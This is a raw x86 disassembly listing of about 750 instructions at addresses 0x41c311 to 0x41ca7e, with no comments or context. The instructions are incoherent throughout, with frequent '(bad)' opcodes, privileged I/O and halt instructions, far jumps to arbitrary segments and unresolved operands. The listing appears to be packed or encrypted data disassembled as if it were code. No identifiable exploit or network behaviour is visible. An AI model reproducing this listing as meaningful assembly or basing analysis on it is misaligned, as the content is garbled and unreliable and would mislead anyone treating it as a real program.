  41c311:	jge    0x41c349
  41c313:	pusha  
  41c314:	loope  0x41c34e
  41c316:	(bad)  
  41c318:	stc    
  41c319:	daa    
  41c31a:	hlt    
  41c31b:	inc    ecx
  41c31c:	mov    ds:0xc9157710,al
  41c321:	jp     0x41c369
  41c323:	xchg   esp,eax
  41c324:	cdq    
  41c325:	and    ebx,DWORD PTR [edi+0x2a35e2e]
  41c32b:	push   ds
  41c32c:	js     0x41c344
  41c32e:	hlt    
  41c32f:	mov    eax,DWORD PTR [edi-0x4e]
  41c332:	adc    al,0x5a
  41c334:	ret    
  41c335:	iret   
  41c336:	(bad)  
  41c338:	cld    
  41c339:	pop    ds
  41c33a:	retf   0x1e30
  41c33d:	xor    bl,BYTE PTR [edx-0x6ef9ed26]
  41c343:	push   edi
  41c344:	addr16 jge 0x41c320
  41c347:	ins    DWORD PTR es:[edi],dx
  41c348:	mov    esi,0xb49dbb39
  41c34d:	push   ebx
  41c34e:	in     al,0xcd
  41c350:	sbb    al,0x6b
  41c352:	fdiv   DWORD PTR [eax-0x36]
  41c355:	or     eax,0x94f6aad0
  41c35a:	aas    
  41c35b:	jns    0x41c372
  41c35d:	rol    BYTE PTR [esi-0x6081d9e7],1
  41c363:	sar    bh,0x63
  41c366:	sub    dl,BYTE PTR [eax-0x3d]
  41c369:	icebp  
  41c36a:	sbb    DWORD PTR [edi],eax
  41c36c:	ins    DWORD PTR es:[edi],dx
  41c36d:	rcr    DWORD PTR [ebx+0x786ac97c],cl
  41c373:	fcom   QWORD PTR [edi+0x79bb46c8]
  41c379:	mul    DWORD PTR [ebp+0x35]
  41c37c:	jle    0x41c370
  41c37e:	repnz mov DWORD PTR [esi],edx
  41c381:	imul   BYTE PTR [esi+edi*8-0x30]
  41c385:	pop    es
  41c386:	xchg   BYTE PTR [eax],ah
  41c388:	stos   DWORD PTR es:[edi],eax
  41c389:	push   esi
  41c38a:	pop    ss
  41c38b:	xchg   ebx,eax
  41c38c:	popa   
  41c38d:	arpl   WORD PTR [ebp-0x706fa599],bp
  41c393:	fwait
  41c394:	xor    BYTE PTR [eax],bl
  41c396:	push   cs
  41c397:	cmp    bl,0xeb
  41c39a:	pop    edi
  41c39b:	xor    ch,ah
  41c39d:	inc    eax
  41c39e:	sar    DWORD PTR [esi+eiz*8+0x14],cl
  41c3a2:	inc    esp
  41c3a3:	jnp    0x41c38d
  41c3a5:	dec    edi
  41c3a6:	not    DWORD PTR [ecx]
  41c3a8:	mov    edx,0x4ebdd646
  41c3ad:	add    ah,BYTE PTR [eax-0x2a69bf6d]
  41c3b3:	and    edi,DWORD PTR [edi-0x5e3706a8]
  41c3b9:	les    ebp,FWORD PTR [ecx+0x13ee6928]
  41c3bf:	jl     0x41c36a
  41c3c1:	cmp    BYTE PTR gs:0xc44a79ee,0xa7
  41c3c9:	or     DWORD PTR [esi*1+0x37312c97],edx
  41c3d0:	jp     0x41c3f4
  41c3d2:	mov    ah,0x59
  41c3d4:	out    dx,eax
  41c3d5:	rol    DWORD PTR [eax+0x21f6dace],cl
  41c3db:	xor    BYTE PTR [eax],0x62
  41c3de:	push   0x8ec84c12
  41c3e3:	jmp    0xc923:0xe5bb6413
  41c3ea:	rol    BYTE PTR [esi+0x53],1
  41c3ed:	push   ds
  41c3ee:	fidivr DWORD PTR [eax-0x11]
  41c3f1:	jl     0x41c3dd
  41c3f3:	inc    esi
  41c3f4:	loope  0x41c38c
  41c3f6:	cmc    
  41c3f7:	int3   
  41c3f8:	loopne 0x41c38d
  41c3fa:	or     esi,DWORD PTR [esi+0x57]
  41c3fd:	(bad)  
  41c3fe:	mov    ebp,0xf7d025dc
  41c403:	imul   esp,DWORD PTR [ecx-0x7f250f98],0x2bece485
  41c40d:	imul   esi,DWORD PTR [edi],0xffffffe3
  41c410:	je     0x41c3e6
  41c412:	sahf   
  41c413:	ds mov bl,0x7d
  41c416:	jo     0x41c46c
  41c418:	add    al,0xc4
  41c41a:	adc    eax,0xe43b140f
  41c41f:	pop    es
  41c420:	jg     0x41c471
  41c422:	mov    ecx,0x27a3062
  41c427:	pop    ds
  41c428:	or     esp,DWORD PTR [ebp+0x54fa926d]
  41c42e:	ret    0x9839
  41c431:	lock inc ebx
  41c433:	pop    esp
  41c434:	and    dl,BYTE PTR [edi]
  41c436:	fsub   QWORD PTR [ebx-0x6cc9c29a]
  41c43c:	dec    ebx
  41c43d:	xchg   esi,eax
  41c43e:	in     al,0xfb
  41c440:	ins    DWORD PTR es:[edi],dx
  41c441:	push   edx
  41c442:	das    
  41c443:	daa    
  41c444:	mov    bh,0x1d
  41c446:	lds    esp,FWORD PTR [ecx-0x42c730eb]
  41c44c:	imul   ecx,DWORD PTR [edi+0x4e364490],0xffffff83
  41c453:	test   DWORD PTR [edx-0x5c],esi
  41c456:	pop    edi
  41c457:	sbb    eax,0x872d60ff
  41c45c:	and    ah,BYTE PTR [edx-0x2d]
  41c45f:	pop    edi
  41c460:	or     cl,BYTE PTR [ebp-0x20a928a7]
  41c466:	add    DWORD PTR [ebx+0x1d85bfb7],esp
  41c46c:	adc    al,0xd2
  41c46e:	fiadd  WORD PTR [esp+eax*1+0x772e3ce0]
  41c475:	jl     0x41c4f1
  41c477:	sbb    dh,cl
  41c479:	xchg   esp,eax
  41c47a:	mov    al,0x87
  41c47c:	and    BYTE PTR [esi],ch
  41c47e:	retf   0x254a
  41c481:	cs xchg edx,eax
  41c483:	jae    0x41c4ce
  41c485:	mov    dh,0x89
  41c487:	fisttp WORD PTR [ebx+eax*2+0x6]
  41c48b:	addr16 daa 
  41c48d:	call   0x595a:0x949075bb
  41c494:	add    esi,0xffffffe3
  41c497:	pop    ds
  41c498:	in     eax,dx
  41c499:	sbb    al,0x49
  41c49b:	mov    al,ds:0x78cd213f
  41c4a0:	fistp  DWORD PTR [esi-0x5a]
  41c4a3:	arpl   WORD PTR [eax+0x43],sp
  41c4a6:	cmp    DWORD PTR [edx],edi
  41c4a8:	ror    DWORD PTR [esi+ebx*2-0x19b17ab4],1
  41c4af:	pop    es
  41c4b0:	pop    ecx
  41c4b1:	push   ds
  41c4b2:	xchg   edi,eax
  41c4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4b4:	popa   
  41c4b5:	mov    dh,0xcb
  41c4b7:	pop    es
  41c4b8:	aad    0x99
  41c4ba:	imul   ecx,DWORD PTR [ebx+0x1d985e14],0xe8fea006
  41c4c4:	jmp    0xf77042a6
  41c4c9:	mov    esi,es
  41c4cb:	test   eax,0x9de5be5a
  41c4d0:	dec    esp
  41c4d1:	call   0x52c3:0x2a89db08
  41c4d8:	je     0x41c4a9
  41c4da:	sbb    DWORD PTR [esi-0x13],esp
  41c4dd:	pop    ds
  41c4de:	xchg   esi,eax
  41c4df:	bound  edx,QWORD PTR [ebx]
  41c4e1:	xlat   BYTE PTR ds:[ebx]
  41c4e2:	xchg   ecx,eax
  41c4e3:	or     eax,0x8e46ef69
  41c4e8:	push   0xffffffba
  41c4ea:	inc    ebx
  41c4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ec:	push   0xc02f3031
  41c4f1:	pushf  
  41c4f2:	mov    ebp,0x49595de
  41c4f7:	shr    BYTE PTR [edx-0x37],cl
  41c4fa:	sbb    al,dh
  41c4fc:	(bad)  
  41c4fd:	retf   
  41c4fe:	adc    al,0x60
  41c500:	leave  
  41c501:	dec    ebp
  41c502:	cs mov ah,0x1d
  41c505:	cmp    eax,DWORD PTR [edx-0x321855c7]
  41c50b:	push   ebx
  41c50c:	sub    ch,BYTE PTR [eax+0x72]
  41c50f:	jmp    0xf4a4:0x7714d5fa
  41c516:	sub    al,0x4c
  41c518:	dec    ebp
  41c519:	ficom  DWORD PTR [esi-0x66bf39f6]
  41c51f:	aas    
  41c520:	dec    esp
  41c521:	ss data16 xor al,0x3c
  41c525:	rcl    BYTE PTR [bx+si+0x3c],0x58
  41c52a:	mov    bh,0x75
  41c52c:	mov    ebp,0x57a159c5
  41c531:	int3   
  41c532:	faddp  st(5),st
  41c534:	(bad)  [edi+0x63]
  41c537:	push   0x44d2a0f6
  41c53c:	fmul   DWORD PTR [edi-0x1bcc6c01]
  41c542:	xchg   esi,eax
  41c543:	mov    ds:0x7338af62,al
  41c548:	inc    ebp
  41c549:	cdq    
  41c54a:	outs   dx,BYTE PTR ds:[esi]
  41c54b:	sti    
  41c54c:	sbb    DWORD PTR [ebp-0x51],eax
  41c54f:	in     eax,dx
  41c550:	(bad)  
  41c551:	in     eax,0xcb
  41c553:	xchg   ebp,ebp
  41c555:	mov    al,0xb6
  41c557:	mov    al,ds:0xe8d3b5ae
  41c55c:	pop    edi
  41c55d:	sahf   
  41c55e:	mov    bl,0xd3
  41c560:	loope  0x41c563
  41c562:	leave  
  41c563:	jae    0x41c507
  41c565:	mov    ds:0x12361d8e,al
  41c56a:	jne    0x41c571
  41c56c:	iret   
  41c56d:	jae    0x41c5b3
  41c56f:	xlat   BYTE PTR ds:[ebx]
  41c570:	pop    edi
  41c571:	retf   
  41c572:	mov    dl,0x73
  41c574:	test   BYTE PTR [edi],0xa0
  41c577:	rcr    DWORD PTR [edx+0x75d21c39],1
  41c57d:	sub    DWORD PTR [eax],edi
  41c57f:	stos   BYTE PTR es:[edi],al
  41c580:	dec    edi
  41c581:	enter  0x5d8a,0xe2
  41c585:	jmp    0x41c5b9
  41c587:	les    ebp,FWORD PTR [ecx]
  41c589:	cs fldl2e 
  41c58c:	pop    edi
  41c58d:	pop    esp
  41c58e:	jno    0x41c559
  41c590:	xchg   esi,eax
  41c591:	std    
  41c592:	aaa    
  41c593:	pop    edx
  41c594:	(bad)  
  41c595:	cmc    
  41c596:	nop
  41c597:	aad    0x2
  41c599:	push   ss
  41c59a:	repz or eax,0xaf8871f9
  41c5a0:	ret    0xf3ac
  41c5a3:	adc    al,0xa1
  41c5a5:	mov    bl,BYTE PTR [ebx]
  41c5a7:	and    esi,DWORD PTR [ebx-0x514cf1fa]
  41c5ad:	fcomp  DWORD PTR [ecx-0x267b47]
  41c5b3:	mov    cl,0x3a
  41c5b5:	xchg   DWORD PTR [edi],edi
  41c5b7:	sar    BYTE PTR [eax+0x13],0xd6
  41c5bb:	jo     0x41c57e
  41c5bd:	push   ecx
  41c5be:	mov    edi,0x1aa8ac0
  41c5c3:	test   cl,cl
  41c5c5:	fs inc eax
  41c5c7:	aad    0x48
  41c5c9:	mov    al,0xc9
  41c5cb:	sbb    dh,al
  41c5cd:	inc    esp
  41c5ce:	fcmovbe st,st(4)
  41c5d0:	add    ebp,DWORD PTR [ebx]
  41c5d2:	jb     0x41c5ee
  41c5d4:	and    BYTE PTR [esi],0xc3
  41c5d7:	mov    BYTE PTR [edi+edx*8-0x353228d7],dh
  41c5de:	add    eax,0xf5b2e0cd
  41c5e3:	call   0xeac9a287
  41c5e8:	aas    
  41c5e9:	pop    edx
  41c5ea:	leave  
  41c5eb:	adc    bl,BYTE PTR [esi-0xf]
  41c5ee:	mov    ch,0x79
  41c5f0:	and    ebx,ebx
  41c5f2:	or     cl,BYTE PTR [esi+0x13]
  41c5f5:	bswap  esp
  41c5f7:	adc    DWORD PTR [edi],ecx
  41c5f9:	mov    ecx,0x7c81e2e7
  41c5fe:	mov    ah,0x2d
  41c600:	push   ecx
  41c601:	jle    0x41c58b
  41c603:	mov    ch,0x3
  41c605:	sti    
  41c606:	jmp    0x3fd4:0x74c8ff4b
  41c60d:	cmp    al,0x87
  41c60f:	dec    edi
  41c610:	mov    ch,0xe6
  41c612:	imul   eax,DWORD PTR [eax+edx*8+0x1f],0x5
  41c617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c618:	gs pop eax
  41c61a:	stc    
  41c61b:	stc    
  41c61c:	in     eax,0xea
  41c61e:	adc    al,BYTE PTR [ecx]
  41c620:	jnp    0x41c5c8
  41c622:	mov    ah,0x81
  41c624:	mov    WORD PTR [eax+0x55d504af],fs
  41c62a:	popf   
  41c62b:	add    BYTE PTR [esi-0x74],bh
  41c62e:	pop    ds
  41c62f:	add    edi,DWORD PTR [edx]
  41c631:	xor    ecx,esp
  41c633:	and    al,0x7c
  41c635:	xchg   ebp,eax
  41c636:	pop    edx
  41c637:	and    esi,0x1a600032
  41c63d:	fwait
  41c63e:	pop    esi
  41c63f:	push   edi
  41c640:	jo     0x41c6b0
  41c642:	mov    ebp,0x48ef32a5
  41c647:	mov    dh,0xa1
  41c649:	pop    ds
  41c64a:	test   al,0xa0
  41c64c:	push   ebx
  41c64d:	xchg   esp,eax
  41c64e:	imul   edx,DWORD PTR [eax+edi*1+0x9],0x1
  41c653:	sbb    dl,ch
  41c655:	scas   al,BYTE PTR es:[edi]
  41c656:	sub    BYTE PTR [edi-0x3b528ceb],0x2
  41c65d:	add    eax,0xc75e2d95
  41c662:	lea    esi,[eax+0x50]
  41c665:	dec    BYTE PTR [edx]
  41c667:	es jl  0x41c69e
  41c66a:	jns    0x41c5ef
  41c66c:	sar    DWORD PTR [ebp-0x286c5ffb],cl
  41c672:	ret    0xf1cf
  41c675:	push   ebx
  41c676:	mov    WORD PTR ds:0xf753843,?
  41c67c:	jae    0x41c6a5
  41c67e:	cmp    bh,bl
  41c680:	dec    eax
  41c681:	call   DWORD PTR [ebx]
  41c683:	inc    edx
  41c684:	inc    esi
  41c685:	and    DWORD PTR [ebp+0x5c],ecx
  41c688:	adc    cl,bl
  41c68a:	push   0xb04e92ff
  41c68f:	jg     0x41c6de
  41c691:	dec    edx
  41c692:	pop    ss
  41c693:	mov    DWORD PTR [edx+edx*8],esp
  41c696:	sbb    cl,BYTE PTR [ebp-0x68c121d0]
  41c69c:	jge    0x41c6ab
  41c69e:	inc    eax
  41c69f:	lods   eax,DWORD PTR ds:[esi]
  41c6a0:	push   ds
  41c6a1:	lods   eax,DWORD PTR ds:[esi]
  41c6a2:	psrld  mm3,mm7
  41c6a5:	dec    ecx
  41c6a6:	cmp    al,BYTE PTR [eax-0xb]
  41c6a9:	or     esi,DWORD PTR [eax]
  41c6ab:	test   eax,0xc8db0f42
  41c6b0:	jle    0x41c6aa
  41c6b2:	cli    
  41c6b3:	xchg   esp,eax
  41c6b4:	int3   
  41c6b5:	js     0x41c707
  41c6b7:	ins    DWORD PTR es:[edi],dx
  41c6b8:	mov    cl,0xe7
  41c6ba:	iret   
  41c6bb:	gs in  al,dx
  41c6bd:	mov    edx,ebx
  41c6bf:	cli    
  41c6c0:	pop    edi
  41c6c1:	jno    0x41c686
  41c6c3:	out    0x99,eax
  41c6c5:	push   esi
  41c6c6:	ficom  WORD PTR [ebx]
  41c6c8:	and    eax,0x5739ab24
  41c6cd:	cmp    eax,0x117e0e3a
  41c6d2:	retf   0xc1bf
  41c6d5:	and    ch,bh
  41c6d7:	and    eax,DWORD PTR [edx-0x3c]
  41c6da:	xchg   esi,eax
  41c6db:	scas   eax,DWORD PTR es:[edi]
  41c6dc:	xchg   si,ax
  41c6de:	jge    0x41c698
  41c6e0:	retf   0x56c3
  41c6e3:	lahf   
  41c6e4:	inc    esp
  41c6e5:	(bad)  
  41c6e6:	icebp  
  41c6e7:	inc    edx
  41c6e8:	outs   dx,BYTE PTR ds:[esi]
  41c6e9:	faddp  st(6),st
  41c6eb:	call   FWORD PTR ds:0xba341ef1
  41c6f1:	fild   DWORD PTR [edi+0x60]
  41c6f4:	test   DWORD PTR [edi+eiz*2],eax
  41c6f7:	cmp    eax,DWORD PTR [esi-0x5e9adb1e]
  41c6fd:	sub    ebp,DWORD PTR [esi]
  41c6ff:	adc    bl,BYTE PTR [edi-0x33d116ba]
  41c705:	pop    edi
  41c706:	(bad)  
  41c707:	ficom  DWORD PTR [eax+0x11a58c7b]
  41c70d:	inc    edx
  41c70e:	addr16 jmp 0xfe678710
  41c714:	jo     0x41c736
  41c716:	mov    ecx,0x80fd1d45
  41c71b:	mov    ch,0xf2
  41c71d:	adc    eax,0x72223466
  41c722:	fnclex 
  41c724:	test   BYTE PTR [esi-0x12],0xb5
  41c728:	mov    ?,eax
  41c72a:	dec    ecx
  41c72b:	mov    dh,0x35
  41c72d:	adc    dl,ah
  41c72f:	loop   0x41c747
  41c731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c732:	dec    esi
  41c733:	mov    ebp,0xb46b6b55
  41c738:	(bad)  
  41c739:	ds scas al,BYTE PTR es:[edi]
  41c73b:	in     eax,0xc9
  41c73d:	jg     0x41c790
  41c73f:	js     0x41c721
  41c741:	mov    edx,0x4171f1eb
  41c746:	cmc    
  41c747:	xor    ah,BYTE PTR [edi]
  41c749:	dec    ecx
  41c74a:	scas   eax,DWORD PTR es:[edi]
  41c74b:	push   ds
  41c74c:	int3   
  41c74d:	pop    esi
  41c74e:	cmp    esi,DWORD PTR [ecx]
  41c750:	(bad)  
  41c752:	jmp    0x37980808
  41c757:	sti    
  41c758:	xor    ecx,0xc7d398df
  41c75e:	bswap  ebx
  41c760:	int3   
  41c761:	aaa    
  41c762:	nop
  41c763:	dec    esi
  41c764:	les    ecx,FWORD PTR [eax-0x732d9de3]
  41c76a:	test   BYTE PTR [eax],bl
  41c76c:	dec    edi
  41c76d:	mov    dl,0x57
  41c76f:	push   ecx
  41c770:	dec    eax
  41c771:	nop
  41c772:	dec    eax
  41c773:	gs adc ebp,eax
  41c776:	push   0x77
  41c778:	cmp    dl,BYTE PTR [ebp+0x4ee05ead]
  41c77e:	mov    al,ds:0x2e18ba7f
  41c783:	in     al,0x5d
  41c785:	rol    BYTE PTR [esi+0x1749829f],cl
  41c78b:	inc    ecx
  41c78c:	lods   eax,DWORD PTR ds:[esi]
  41c78e:	les    esi,FWORD PTR ss:[edx]
  41c791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c792:	addr16 pop esi
  41c794:	neg    ah
  41c796:	out    dx,eax
  41c797:	retf   0xfe11
  41c79a:	dec    ebp
  41c79b:	fst    QWORD PTR [esi]
  41c79d:	push   0xfffffff8
  41c79f:	loop   0x41c739
  41c7a1:	cs adc al,0x45
  41c7a4:	dec    ebp
  41c7a5:	out    0xe0,al
  41c7a7:	retf   
  41c7a8:	mov    bl,BYTE PTR [esi-0x13]
  41c7ab:	in     al,0x92
  41c7ad:	adc    esp,esp
  41c7af:	pop    ebp
  41c7b0:	push   ebx
  41c7b1:	inc    edi
  41c7b2:	loop   0x41c826
  41c7b4:	into   
  41c7b5:	in     al,0x36
  41c7b7:	push   edx
  41c7b8:	lods   eax,DWORD PTR ds:[esi]
  41c7b9:	rol    BYTE PTR [ebx+eax*1+0x78],cl
  41c7bd:	mov    BYTE PTR [edx-0x44],dh
  41c7c0:	shr    BYTE PTR [eax+ebp*1-0x5b899236],0xd1
  41c7c8:	xor    dl,BYTE PTR gs:[ebx+0x4c]
  41c7cc:	fmul   QWORD PTR [ebx+0x12]
  41c7cf:	sub    al,0x98
  41c7d1:	sbb    DWORD PTR [ebx+0x2d],ebx
  41c7d4:	jge    0x41c789
  41c7d6:	xor    DWORD PTR [ebx],esi
  41c7d8:	add    bl,BYTE PTR ds:0x26fe85b5
  41c7de:	jge    0x41c77a
  41c7e0:	stos   BYTE PTR es:[edi],al
  41c7e1:	pop    esi
  41c7e2:	or     DWORD PTR [esi],eax
  41c7e4:	and    al,0xfc
  41c7e6:	into   
  41c7e7:	(bad)  
  41c7e8:	setge  BYTE PTR [ebx+0x2c]
  41c7ec:	jle    0x41c7ed
  41c7ee:	popa   
  41c7ef:	pushf  
  41c7f0:	xchg   BYTE PTR [edi+0x9],ch
  41c7f3:	(bad)  
  41c7f4:	jo     0x41c873
  41c7f6:	fistp  QWORD PTR [ecx-0x62cd15e0]
  41c7fc:	dec    ecx
  41c7fd:	ret    0x5fdd
  41c800:	rol    BYTE PTR [ebp-0x59436b8c],0xad
  41c807:	mov    WORD PTR [esi+eiz*1-0x2bb9440c],?
  41c80e:	lods   eax,DWORD PTR ds:[esi]
  41c80f:	adc    edx,DWORD PTR [eax]
  41c811:	and    BYTE PTR [eax],bh
  41c813:	adc    eax,0x9c1264bb
  41c818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c819:	jl     0x41c7a3
  41c81b:	imul   ecx,DWORD PTR ds:0xf95d90ae,0xffffffb6
  41c822:	cmp    BYTE PTR [edx*8-0x3520f81a],al
  41c829:	stos   DWORD PTR es:[edi],eax
  41c82a:	xchg   esp,eax
  41c82b:	or     eax,0xce8bc763
  41c830:	ficomp DWORD PTR fs:[ecx]
  41c833:	sar    BYTE PTR [esi+edx*1+0x57],1
  41c837:	cmp    al,0x38
  41c839:	jnp    0x41c832
  41c83b:	add    al,0x4d
  41c83d:	mov    al,es:0x4567425
  41c843:	mov    eax,ds:0xcfced09c
  41c848:	push   edi
  41c849:	fxch   st(0)
  41c84b:	mov    ds,ecx
  41c84d:	mov    eax,0xe9a4cd4e
  41c852:	and    al,0xfc
  41c854:	jecxz  0x41c8a4
  41c856:	int3   
  41c857:	lahf   
  41c858:	pop    esp
  41c859:	mov    BYTE PTR [ebx],ah
  41c85b:	fucomp st(0)
  41c85d:	xchg   ebx,eax
  41c85e:	and    ah,dh
  41c860:	nop
  41c861:	push   0x175fa264
  41c866:	push   es
  41c867:	cs jne 0x41c881
  41c86a:	fistp  WORD PTR ss:[ebp+0x52affea5]
  41c871:	or     al,0xac
  41c873:	jb     0x41c808
  41c875:	mov    BYTE PTR gs:[eax+0x3e],dl
  41c879:	test   ecx,0x73caf08b
  41c87f:	lock int 0x94
  41c882:	loopne 0x41c8ac
  41c884:	ror    BYTE PTR [ecx+ecx*8],cl
  41c887:	scas   eax,DWORD PTR es:[edi]
  41c888:	adc    BYTE PTR [esi],dh
  41c88a:	mov    ds:0x3d6a404a,eax
  41c88f:	sahf   
  41c890:	fwait
  41c891:	mov    es,WORD PTR [esi+0x2b]
  41c894:	outs   dx,BYTE PTR ds:[esi]
  41c895:	stc    
  41c896:	loopne 0x41c8c9
  41c898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c899:	xor    DWORD PTR [edi+0x64],ecx
  41c89c:	fwait
  41c89d:	xchg   ebx,eax
  41c89e:	cld    
  41c89f:	cmp    al,0x48
  41c8a1:	dec    ebx
  41c8a2:	dec    esi
  41c8a3:	xor    DWORD PTR [ebp-0x76c4433a],ebp
  41c8a9:	add    esp,ecx
  41c8ab:	lods   eax,DWORD PTR ds:[esi]
  41c8ac:	jbe    0x41c87f
  41c8ae:	ins    BYTE PTR es:[edi],dx
  41c8af:	fsubrp st(3),st
  41c8b1:	and    al,0x7a
  41c8b3:	or     eax,0x338c6b1b
  41c8b8:	adc    esi,DWORD PTR [ebp-0x47]
  41c8bb:	pop    esp
  41c8bc:	out    0xf9,al
  41c8be:	and    BYTE PTR [ecx],al
  41c8c0:	jmp    0x41c84f
  41c8c2:	xchg   edi,eax
  41c8c3:	push   edx
  41c8c4:	mov    ds:0xe8975e7f,al
  41c8c9:	push   eax
  41c8ca:	xor    dl,BYTE PTR [eax+0x26df16dd]
  41c8d0:	es sbb eax,0x70587469
  41c8d6:	pop    ss
  41c8d7:	xor    dh,BYTE PTR ds:0x7c61b9e8
  41c8dd:	inc    ecx
  41c8de:	mov    edx,0xf30060f4
  41c8e3:	jae    0x41c946
  41c8e5:	mov    ebp,DWORD PTR [edx-0x42]
  41c8e8:	imul   ebp,DWORD PTR [eax-0x7f],0xffffff85
  41c8ec:	lods   al,BYTE PTR ds:[esi]
  41c8ed:	pusha  
  41c8ee:	cmc    
  41c8ef:	out    0x57,eax
  41c8f1:	xor    BYTE PTR [ecx-0x77],ah
  41c8f4:	and    al,ah
  41c8f6:	dec    ecx
  41c8f7:	imul   ebp,DWORD PTR [ebx+0x1f],0x207b01b1
  41c8fe:	cwde   
  41c8ff:	shl    BYTE PTR [ebp-0x58],0x79
  41c903:	popa   
  41c904:	fisubr WORD PTR [edx+0x65]
  41c907:	push   cs
  41c908:	fwait
  41c909:	sub    al,0x2
  41c90b:	in     al,0x8a
  41c90d:	cmp    DWORD PTR [ebx-0x156aa8e8],eax
  41c913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c914:	and    eax,DWORD PTR [edi-0x71]
  41c917:	clc    
  41c918:	cmp    al,0x9a
  41c91a:	in     eax,dx
  41c91b:	push   ebp
  41c91c:	xchg   ebp,eax
  41c91d:	(bad)  
  41c91e:	mov    edi,0xddeff48a
  41c923:	add    ah,0xf3
  41c926:	xor    ecx,DWORD PTR [edx-0x79840d9c]
  41c92c:	xor    al,0xc9
  41c92e:	xchg   edi,eax
  41c92f:	icebp  
  41c930:	mov    dh,BYTE PTR [esi-0x28fb7868]
  41c936:	xchg   ecx,eax
  41c937:	inc    eax
  41c938:	cli    
  41c939:	push   ebx
  41c93a:	inc    esi
  41c93b:	es dec edx
  41c93d:	inc    edi
  41c93e:	adc    eax,0x11dc1708
  41c943:	jmp    ebp
  41c945:	jmp    0x5b0ced54
  41c94a:	pop    edx
  41c94b:	lea    eax,[edx]
  41c94d:	out    dx,eax
  41c94e:	out    dx,eax
  41c94f:	push   0x6a
  41c951:	push   ecx
  41c952:	cli    
  41c953:	push   es
  41c954:	mov    al,ds:0x94528af8
  41c959:	and    dl,BYTE PTR [ebx+0x37081142]
  41c95f:	je     0x41c8f1
  41c961:	mov    WORD PTR [ecx+0x6f4be268],ss
  41c967:	sbb    DWORD PTR [ecx],edi
  41c969:	in     al,dx
  41c96a:	or     DWORD PTR [ebp+0x4eba6c03],ebp
  41c970:	pop    ebp
  41c971:	push   esi
  41c972:	repz lahf 
  41c974:	jmp    0x41c91c
  41c976:	pop    ds
  41c977:	xchg   ebp,eax
  41c978:	sub    eax,0xc341e084
  41c97d:	adc    ah,cl
  41c97f:	iret   
  41c980:	mov    eax,ds:0xc116a049
  41c985:	imul   esi,edx,0xffffffe9
  41c988:	sbb    esi,DWORD PTR [eax-0x2adb3fa0]
  41c98e:	out    dx,al
  41c98f:	sbb    ecx,DWORD PTR [eax+0x15]
  41c992:	(bad)  
  41c994:	push   eax
  41c995:	call   0x84ed98f6
  41c99a:	mov    esp,0x4fd54650
  41c99f:	add    ebx,DWORD PTR [edx]
  41c9a1:	add    BYTE PTR [esi-0x62],0xb1
  41c9a5:	jge    0x41c9c1
  41c9a7:	jnp    0x41c94e
  41c9a9:	mov    bl,0xa2
  41c9ab:	sub    dh,bh
  41c9ad:	or     al,dh
  41c9af:	std    
  41c9b0:	and    eax,0x9cace4ee
  41c9b5:	stc    
  41c9b6:	sbb    bl,BYTE PTR [edi-0x64f98ef0]
  41c9bc:	push   0xffffffce
  41c9be:	sar    DWORD PTR [eax],cl
  41c9c0:	imul   esi,ecx,0x6f
  41c9c3:	dec    ebp
  41c9c4:	scas   al,BYTE PTR es:[edi]
  41c9c5:	mov    ds:0x596cf1ba,al
  41c9ca:	add    eax,0x730dcfd7
  41c9cf:	stc    
  41c9d0:	xchg   ebp,eax
  41c9d1:	aad    0xfe
  41c9d3:	sar    ebx,cl
  41c9d5:	and    eax,0xa2cf01a8
  41c9da:	fidiv  WORD PTR [eax+edx*8-0x58]
  41c9de:	mov    ebx,0x53bd64c
  41c9e3:	outs   dx,DWORD PTR ds:[esi]
  41c9e4:	imul   ebp,DWORD PTR [eax-0x338bb10c],0xffffffad
  41c9eb:	ja     0x41c99a
  41c9ed:	out    dx,eax
  41c9ee:	enter  0x60bf,0x85
  41c9f2:	out    0xb1,eax
  41c9f4:	stc    
  41c9f5:	lods   eax,DWORD PTR ds:[esi]
  41c9f6:	mov    eax,ds:0x9d06b0d4
  41c9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9fc:	push   0x61
  41c9fe:	adc    al,0x6d
  41ca00:	xchg   esp,eax
  41ca01:	fs pusha 
  41ca03:	das    
  41ca04:	in     eax,0xb5
  41ca06:	clc    
  41ca07:	test   DWORD PTR [ebx],eax
  41ca09:	push   0xcc846341
  41ca0e:	xchg   ebp,eax
  41ca0f:	(bad)  
  41ca10:	mov    ?,WORD PTR [eax]
  41ca12:	cdq    
  41ca13:	test   al,0x76
  41ca15:	mov    DWORD PTR cs:[ebp+0x7],ebx
  41ca19:	or     edx,edi
  41ca1b:	aaa    
  41ca1c:	sbb    al,0x2d
  41ca1e:	popf   
  41ca1f:	cdq    
  41ca20:	outs   dx,DWORD PTR ds:[esi]
  41ca21:	push   0x50
  41ca23:	addr16 push 0xffffff88
  41ca26:	inc    edx
  41ca27:	call   0xdf68ae4e
  41ca2c:	jns    0x41ca6b
  41ca2e:	jns    0x41c9be
  41ca30:	loop   0x41ca57
  41ca32:	jmp    0xd380:0xabe8
  41ca38:	test   eax,0xe21c482c
  41ca3d:	or     edi,eax
  41ca3f:	mov    edx,0xce2b03ee
  41ca44:	mov    ecx,0x1943e705
  41ca49:	std    
  41ca4a:	pop    esi
  41ca4b:	fs push edi
  41ca4d:	ja     0x41c9e2
  41ca4f:	sbb    dh,BYTE PTR [edx]
  41ca51:	stc    
  41ca52:	push   cs
  41ca53:	jmp    0xa6ab9c8e
  41ca58:	add    DWORD PTR [ecx],0xfe2438b2
  41ca5e:	lock pop eax
  41ca60:	mov    DWORD PTR [edx+0xc3feea2],esp
  41ca66:	shr    BYTE PTR [edi],cl
  41ca68:	cmp    eax,0x39ac77cc
  41ca6d:	scas   al,BYTE PTR es:[edi]
  41ca6e:	pop    edx
  41ca6f:	mov    ch,0xb4
  41ca71:	lods   al,BYTE PTR ds:[esi]
  41ca72:	leave  
  41ca73:	cld    
  41ca74:	(bad)  
  41ca76:	std    
  41ca77:	mul    DWORD PTR [edx]
  41ca79:	(bad)  
  41ca7a:	jg     0x41ca9a
  41ca7c:	repnz hlt 
  41ca7e:	push   0x28c1cfb7
